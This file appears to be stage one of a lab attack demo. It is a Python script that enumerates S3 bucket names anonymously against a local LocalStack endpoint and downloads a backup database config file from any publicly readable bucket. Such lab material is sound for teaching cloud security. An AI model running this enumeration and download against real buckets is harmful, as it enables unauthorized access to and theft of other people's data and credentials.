"""STAGE 1 — Recon / bucket enumeration.
Anonymous attacker probes a wordlist of likely bucket names against the
LocalStack S3 endpoint and finds one that's publicly readable."""
import os

import boto3
from botocore import UNSIGNED
from botocore.config import Config
from botocore.exceptions import ClientError

ENDPOINT = os.environ.get("LOCALSTACK_ENDPOINT", "http://localhost:4566")

WORDLIST = [
    "backups", "assets", "public-conf-bucket-demo", "static-assets",
    "company-data", "logs-archive", "internal-customer-data", "config-bucket",
]


def main():
    print("=== STAGE 1: Recon — anonymous S3 bucket enumeration ===")
    s3 = boto3.client(
        "s3",
        endpoint_url=ENDPOINT,
        config=Config(signature_version=UNSIGNED),
        region_name="us-east-1",
    )

    found_bucket = None
    for name in WORDLIST:
        try:
            resp = s3.list_objects_v2(Bucket=name)
            objects = [o["Key"] for o in resp.get("Contents", [])]
            print(f"[+] {name}: READABLE — {objects}")
            found_bucket = name
        except ClientError as e:
            code = e.response.get("Error", {}).get("Code", "?")
            print(f"[-] {name}: not accessible ({code})")

    if not found_bucket:
        print("No public bucket found. Check that seed_environment.py ran successfully.")
        return

    print(f"\n[+] Downloading backup/db_config.yaml.bak from '{found_bucket}'...")
    obj = s3.get_object(Bucket=found_bucket, Key="backup/db_config.yaml.bak")
    content = obj["Body"].read()
    with open("attacker/downloaded_config.yaml.bak", "wb") as f:
        f.write(content)
    print("[+] Saved to attacker/downloaded_config.yaml.bak")
    print("=== STAGE 1 COMPLETE ===\n")


if __name__ == "__main__":
    main()
